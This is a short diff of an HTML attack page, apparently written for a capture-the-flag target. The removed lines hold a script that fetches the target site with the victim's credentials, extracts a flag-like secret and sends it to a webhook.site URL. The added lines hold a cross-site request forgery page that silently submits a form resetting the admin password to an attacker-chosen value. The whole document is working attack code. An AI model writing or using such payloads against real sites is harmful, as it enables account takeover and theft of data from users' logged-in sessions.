@@ -1,11 +1,7 @@
-<!doctype html><html><body><script>
-fetch('https://cats.is-course.ru/', {credentials:'include'})
-  .then(r => r.text())
-  .then(t => {
-    const m = t.match(/YDS\{[^}]*\}/);
-    const v = m ? m[0] : ('NOFLAG ' + t.length);
-    // navigation-based exfil is most robust:
-    location.href = 'https://webhook.site/aeca723c-e09e-4e59-a968-62631a54756f/flag?x=' + encodeURIComponent(v);
-  })
-  .catch(e => { location.href = 'https://webhook.site/aeca723c-e09e-4e59-a968-62631a54756f/err?x=' + encodeURIComponent(''+e); });
-</script></body></html>
+<!doctype html><html><body>
+<form id="f" action="https://cats.is-course.ru/settings" method="POST">
+  <input type="hidden" name="password" value="Pwnedadmin123!@">
+  <input type="hidden" name="confirm-password" value="Pwnedadmin123!@">
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
